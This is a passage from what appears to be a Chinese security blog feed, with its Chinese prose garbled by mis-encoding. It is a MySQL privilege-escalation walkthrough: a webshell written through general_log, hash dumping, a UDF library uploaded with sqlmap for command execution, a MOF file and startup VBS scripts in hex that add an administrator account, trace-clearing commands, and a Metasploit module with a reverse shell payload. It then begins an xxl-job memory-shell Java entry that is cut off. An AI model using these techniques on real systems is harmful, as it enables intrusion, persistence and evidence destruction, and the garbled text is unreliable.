<p>å¯ä»¥å°è¯•è‡ªå®šä¹‰æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶å‘æ—¥å¿—æ–‡ä»¶é‡Œé¢å†™å…¥å†…å®¹çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥æˆåŠŸ getshellï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># æ›´æ”¹æ—¥å¿—æ–‡ä»¶ä½ç½®</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å½“å‰é…ç½®</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> <span class="keyword">ON</span>                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>info.php <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"></span><br><span class="line"># å¾€æ—¥å¿—é‡Œé¢å†™å…¥ payload</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># æ­¤æ—¶å·²ç»å†™åˆ° info.php æ–‡ä»¶å½“ä¸­äº†</span><br><span class="line">root<span class="variable">@c1595d3a029a</span>:<span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>$ cat info.php </span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>mysqld, Version: <span class="number">5.5</span><span class="number">.61</span><span class="number">-0</span>ubuntu0<span class="number">.14</span><span class="number">.04</span><span class="number">.1</span> ((Ubuntu)). started <span class="keyword">with</span>:</span><br><span class="line">Tcp port: <span class="number">3306</span>  Unix socket: <span class="operator">/</span>var<span class="operator">/</span>run<span class="operator">/</span>mysqld<span class="operator">/</span>mysqld.sock</span><br><span class="line"><span class="type">Time</span>                 Id Command    Argument</span><br><span class="line"><span class="number">201031</span> <span class="number">21</span>:<span class="number">14</span>:<span class="number">46</span>       <span class="number">40</span> Query    <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span></span><br><span class="line"><span class="number">201031</span> <span class="number">21</span>:<span class="number">15</span>:<span class="number">34</span>       <span class="number">40</span> Query    <span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Hash-è·å–ä¸è§£å¯†"><a href="#Hash-è·å–ä¸è§£å¯†" class="headerlink" title="Hash è·å–ä¸è§£å¯†"></a>Hash è·å–ä¸è§£å¯†</h2><p>å‡è®¾å­˜åœ¨ SQL æ³¨å…¥ DBA æƒé™ï¼Œå¦‚æœç›®æ ‡ 3306 ç«¯å£ä¹Ÿæ˜¯å¯ä»¥è®¿é—®é€šçš„è¯ï¼Œå¯ä»¥å°è¯•è¯»å– MySQL çš„ Hash æ¥è§£å¯†ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> host, <span class="keyword">user</span>, password <span class="keyword">from</span> mysql.user;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€… å­˜åœ¨ç½‘é¡µåå° ï¼Œ æ‰¾ä¸€ä¸‹ åå°çš„è´¦å·å¯†ç </p>
<h2 id="UDFææƒ"><a href="#UDFææƒ" class="headerlink" title="UDFææƒ"></a>UDFææƒ</h2><p>sqlmapå’Œ msf å‡è‡ªå¸¦ udfææƒæ’ä»¶ ï¼ˆsqlmap çš„éœ€è¦è§£ç ï¼‰</p>
<p><strong>å¯»æ‰¾æ’ä»¶ç›®å½•</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name <span class="operator">|</span> <span class="keyword">Value</span>                        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> plugin_dir    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>mysql<span class="operator">/</span>lib<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br></pre></td></tr></table></figure>

<h3 id="å†™å…¥åŠ¨æ€é“¾æ¥åº“"><a href="#å†™å…¥åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="å†™å…¥åŠ¨æ€é“¾æ¥åº“"></a>å†™å…¥åŠ¨æ€é“¾æ¥åº“</h3><p>å†™å…¥åŠ¨æ€é“¾æ¥åº“å¯ä»¥åˆ†ä¸ºä¸‹é¢å‡ ç§æƒ…å½¢ï¼š</p>
<p>SQL æ³¨å…¥ä¸”æ˜¯é«˜æƒé™ï¼Œplugin ç›®å½•å¯å†™ä¸”éœ€è¦ secure_file_priv æ— é™åˆ¶ï¼ŒMySQL æ’ä»¶ç›®å½•å¯ä»¥è¢« MySQL ç”¨æˆ·å†™å…¥ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ sqlmap æ¥ä¸Šä¼ åŠ¨æ€é“¾æ¥åº“ï¼Œåˆå› ä¸º GET æœ‰<strong>å­—èŠ‚é•¿åº¦é™åˆ¶</strong>ï¼Œæ‰€ä»¥å¾€å¾€ POST æ³¨å…¥æ‰å¯ä»¥æ‰§è¡Œè¿™ç§æ”»å‡»</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:30008/&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --file-write=<span class="string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ²¡æœ‰æ³¨å…¥çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥æ“ä½œåŸç”Ÿ SQL è¯­å¥ï¼Œ</p>
<p>è¿™ç§æƒ…å†µä¸‹å½“ secure_file_priv æ— é™åˆ¶çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯å¯ä»¥æ‰‹å·¥å†™æ–‡ä»¶åˆ° plugin ç›®å½•ä¸‹çš„ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># ç›´æ¥ <span class="keyword">SELECT</span> æŸ¥è¯¢åå…­è¿›åˆ¶å†™å…¥</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c4602</span>... <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># è§£ç åå…­è¿›åˆ¶å†å†™å…¥å¤šæ­¤ä¸€ä¸¾</span><br><span class="line"><span class="keyword">SELECT</span> unhex(<span class="string">&#x27;7f454c4602...&#x27;</span>) <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„åå…­è¿›åˆ¶æ€ä¹ˆè·å–å‘¢ï¼Ÿå¯ä»¥åˆ©ç”¨ MySQL è‡ªå¸¦çš„ hex å‡½æ•°æ¥ç¼–ç ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># ç›´æ¥ä¼ å…¥è·¯å¾„ç¼–ç </span><br><span class="line"><span class="keyword">SELECT</span> hex(load_file(<span class="string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));</span><br><span class="line"></span><br><span class="line"># ä¹Ÿå¯ä»¥å°†è·¯å¾„ hex ç¼–ç </span><br><span class="line"><span class="keyword">SELECT</span> hex(load_file(<span class="number">0x2f6c69625f6d7973716c7564665f7379735f36342e736f</span>));</span><br></pre></td></tr></table></figure>

<h3 id="åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤"><a href="#åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤" class="headerlink" title="åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤"></a>åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>å¯¼å…¥æˆåŠŸåæŸ¥çœ‹ä¸€ä¸‹ mysql å‡½æ•°é‡Œé¢æ˜¯å¦æ–°å¢äº† sys_evalï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl      <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> udf.dll <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„ sys_eval æ”¯æŒè‡ªå®šä¹‰ï¼Œæ¥ç€å°±å¯ä»¥é€šè¿‡åˆ›å»ºçš„è¿™ä¸ªå‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql &gt; <span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>å¦‚æœåœ¨ Windows ç³»ç»Ÿä¸‹çš„è¯åº”è¯¥å°±æ˜¯æœ€é«˜æƒé™äº†ï¼Œæ‰§è¡Œä¸€äº› net user å¢åŠ ç”¨æˆ·çš„å‘½ä»¤åº”è¯¥éƒ½æ˜¯å¯ä»¥æˆåŠŸçš„</p>
<h3 id="åˆ é™¤è‡ªå®šä¹‰å‡½æ•°"><a href="#åˆ é™¤è‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="åˆ é™¤è‡ªå®šä¹‰å‡½æ•°"></a>åˆ é™¤è‡ªå®šä¹‰å‡½æ•°</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure>

<h3 id="UDFshell"><a href="#UDFshell" class="headerlink" title="UDFshell"></a>UDFshell</h3><p>ä¸å‡ºç½‘çš„è¯ï¼Œ æ— æ³•ç›´è¿MySQL</p>
<h3 id="UDF-PHP"><a href="#UDF-PHP" class="headerlink" title="UDF.PHP"></a>UDF.PHP</h3><p><a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">t00ls UDF.PHP</a> ç®€å•æ–¹ä¾¿ï¼Œä¸€é”® DUMP UDF å’Œå‡½æ•°ï¼Œæ“ä½œé—¨æ§›é™ä½äº†å¾ˆå¤šï¼š</p>
<p>æˆ–è€… ä½¿ç”¨ Navicat è‡ªå¸¦çš„ tunnel éš§é“è„šæœ¬ ï¼Œ ç±»ä¼¼äº reGeorg</p>
<h2 id="MOFææƒ"><a href="#MOFææƒ" class="headerlink" title="MOFææƒ"></a>MOFææƒ</h2><p>MOF ææƒæ˜¯ä¸€ä¸ªæœ‰å†å²çš„æ¼æ´ï¼ŒåŸºæœ¬ä¸Šåœ¨ Windows Server 2003 çš„ç¯å¢ƒä¸‹æ‰å¯ä»¥æˆåŠŸã€‚ææƒçš„åŸç†æ˜¯C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;ç›®å½•ä¸‹çš„ mof æ–‡ä»¶æ¯ éš”ä¸€æ®µæ—¶é—´ï¼ˆå‡ ç§’é’Ÿå·¦å³ï¼‰éƒ½ä¼šè¢«ç³»ç»Ÿæ‰§è¡Œï¼Œå› ä¸ºè¿™ä¸ª MOF é‡Œé¢æœ‰ä¸€éƒ¨åˆ†æ˜¯ VBS è„šæœ¬ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ª VBS è„šæœ¬æ¥è°ƒç”¨ CMD æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœ MySQL æœ‰æƒé™æ“ä½œ mof ç›®å½•çš„è¯ï¼Œå°±å¯ä»¥æ¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ã€‚</p>
<p>mof è„šæœ¬çš„å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ ¸å¿ƒ payload ä¸ºï¼š</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>MySQL å†™æ–‡ä»¶çš„ç‰¹æ€§å°†è¿™ä¸ª MOF æ–‡ä»¶å¯¼å…¥åˆ° C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; ç›®å½•ä¸‹ï¼Œä¾ç„¶é‡‡ç”¨ä¸Šè¿°ç¼–ç çš„æ–¹å¼ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span> <span class="keyword">into</span> dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡ŒæˆåŠŸçš„çš„æ—¶å€™ï¼Œtest.mof ä¼šå‡ºç°åœ¨ï¼šc:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;goog&#x2F; ç›®å½•ä¸‹ å¦åˆ™å‡ºç°åœ¨ c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;bad ç›®å½•ä¸‹ï¼š</p>
<h3 id="ç—•è¿¹æ¸…ç†"><a href="#ç—•è¿¹æ¸…ç†" class="headerlink" title="ç—•è¿¹æ¸…ç†"></a>ç—•è¿¹æ¸…ç†</h3><p>å› ä¸ºæ¯éš”å‡ åˆ†é’Ÿæ—¶é—´åˆä¼šé‡æ–°æ‰§è¡Œæ·»åŠ ç”¨æˆ·çš„å‘½ä»¤ï¼Œæ‰€ä»¥æƒ³è¦æ¸…ç†ç—•è¿¹å¾—å…ˆæš‚æ—¶å…³é—­ winmgmt æœåŠ¡å†åˆ é™¤ç›¸å…³ mof æ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™å†åˆ é™¤ç”¨æˆ·æ‰ä¼šæœ‰æ•ˆæœï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åœæ­¢ winmgmt æœåŠ¡</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤ Repository æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰‹åŠ¨åˆ é™¤ mof æ–‡ä»¶</span></span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤åˆ›å»ºçš„ç”¨æˆ·</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡æ–°å¯åŠ¨æœåŠ¡</span></span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>

<h3 id="MSF-MOF-ææƒ"><a href="#MSF-MOF-ææƒ" class="headerlink" title="MSF MOF ææƒ"></a>MSF MOF ææƒ</h3><p>MSF é‡Œé¢ä¹Ÿè‡ªå¸¦äº† MOF ææƒæ¨¡å—ï¼Œä½¿ç”¨èµ·æ¥ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿è€Œä¸”ä¹Ÿåšåˆ°äº†è‡ªåŠ¨æ¸…ç†ç—•è¿¹çš„æ•ˆæœï¼Œå®é™…æ“ä½œèµ·æ¥æ•ˆç‡ä¹Ÿè¿˜ä¸é”™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="comment"># è®¾ç½®å¥½è‡ªå·±çš„ payload</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®ç›®æ ‡ MySQL çš„åŸºç¡€ä¿¡æ¯</span></span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 10.211.55.21</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> username root</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> password root</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>



<h2 id="å¯åŠ¨é¡¹ææƒ"><a href="#å¯åŠ¨é¡¹ææƒ" class="headerlink" title="å¯åŠ¨é¡¹ææƒ"></a>å¯åŠ¨é¡¹ææƒ</h2><p>è¿™ç§ææƒä¹Ÿå¸¸è§äº Windows ç¯å¢ƒä¸‹ï¼Œå½“ Windows çš„å¯åŠ¨é¡¹å¯ä»¥è¢« MySQL å†™å…¥çš„æ—¶å€™å¯ä»¥ä½¿ç”¨ MySQL å°†è‡ªå®šä¹‰è„šæœ¬å¯¼å…¥åˆ°å¯åŠ¨é¡¹ä¸­ï¼Œè¿™ä¸ªè„šæœ¬ä¼šåœ¨ç”¨æˆ·ç™»å½•ã€å¼€æœºã€å…³æœºçš„æ—¶å€™è‡ªåŠ¨è¿è¡Œã€‚</p>
<h4 id="å¯åŠ¨é¡¹è·¯å¾„"><a href="#å¯åŠ¨é¡¹è·¯å¾„" class="headerlink" title="å¯åŠ¨é¡¹è·¯å¾„"></a>å¯åŠ¨é¡¹è·¯å¾„</h4><p><strong>Windows Server 2003</strong> çš„å¯åŠ¨é¡¹è·¯å¾„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸­æ–‡ç³»ç»Ÿ</span></span><br><span class="line">C:\Documents and Settings\Administrator\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨</span><br><span class="line">C:\Documents and Settings\All Users\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨</span><br><span class="line"></span><br><span class="line"><span class="comment"># è‹±æ–‡ç³»ç»Ÿ</span></span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å…³æœºé¡¹ éœ€è¦è‡ªå·±å»ºç«‹å¯¹åº”æ–‡ä»¶å¤¹</span></span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br></pre></td></tr></table></figure>

<p><strong>Windows Server 2008</strong> çš„å¯åŠ¨é¡¹è·¯å¾„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶çŸ¥é“è·¯å¾„çš„è¯å°±å¾€å¯åŠ¨é¡¹è·¯å¾„é‡Œé¢å†™å…¥è„šæœ¬å§ï¼Œè„šæœ¬æ”¯æŒ vbs å’Œ exe ç±»å‹ï¼Œå¯ä»¥åˆ©ç”¨ vbs æ‰§è¡Œä¸€äº› CMD å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ exe ä¸Šçº¿ MSF æˆ–è€… CS è¿™æ–¹é¢è¿˜æ˜¯æ¯”è¾ƒçµæ´»çš„ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªæ‰§è¡ŒåŸºç¡€å‘½ä»¤çš„ VB è„šæœ¬ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Set WshShell=WScript.CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">WshShell.Run <span class="string">&quot;net user hacker P@ssw0rd /add&quot;</span>, 0</span><br><span class="line">WshShell.Run <span class="string">&quot;net localgroup administrators hacker /add&quot;</span>, 0</span><br></pre></td></tr></table></figure>

<h4 id="MySQL-å†™å…¥å¯åŠ¨é¡¹"><a href="#MySQL-å†™å…¥å¯åŠ¨é¡¹" class="headerlink" title="MySQL å†™å…¥å¯åŠ¨é¡¹"></a>MySQL å†™å…¥å¯åŠ¨é¡¹</h4><p>å°†ä¸Šè¿° vbs æˆ–è€… CS çš„é©¬è½¬åå…­è¿›åˆ¶ç›´æ¥å†™å¦‚åˆ°ç³»ç»Ÿå¯åŠ¨é¡¹ä¸­ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A</span> <span class="keyword">into</span> dumpfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&quot;;</span><br></pre></td></tr></table></figure>

<p>å†™å…¥æˆåŠŸçš„æ—¶å€™å°±ç­‰å¾…ç³»ç»Ÿç”¨æˆ·é‡æ–°ç™»å½•ï¼Œç™»å½•æˆåŠŸçš„è¯ï¼Œæˆ‘ä»¬çš„è‡ªå®šä¹‰è„šæœ¬ä¹Ÿå°±ä¼šè¢«æ‰§è¡Œã€‚</p>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p>MySQL æ¼æ´åˆ©ç”¨ä¸ææƒ | å›½å…‰<br><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>MySQL</tag>
        <tag>æ€»ç»“</tag>
      </tags>
  </entry>
  <entry>
    <title>xxl-job-executorå†…å­˜é©¬</title>
    <url>/articles/4ac9859d/</url>
    <content><![CDATA[<h2 id="2-2-0"><a href="#2-2-0" class="headerlink" title="2.2.0"></a>2.2.0</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.executor.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.ExecutorBiz;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.impl.ExecutorBizImpl;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.server.EmbedServer;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.Unpooled;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.http.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.timeout.IdleStateHandler;</span><br><span class="line"><span class="keyword">import</span> io.netty.util.CharsetUtil;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.ByteBuf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.SocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 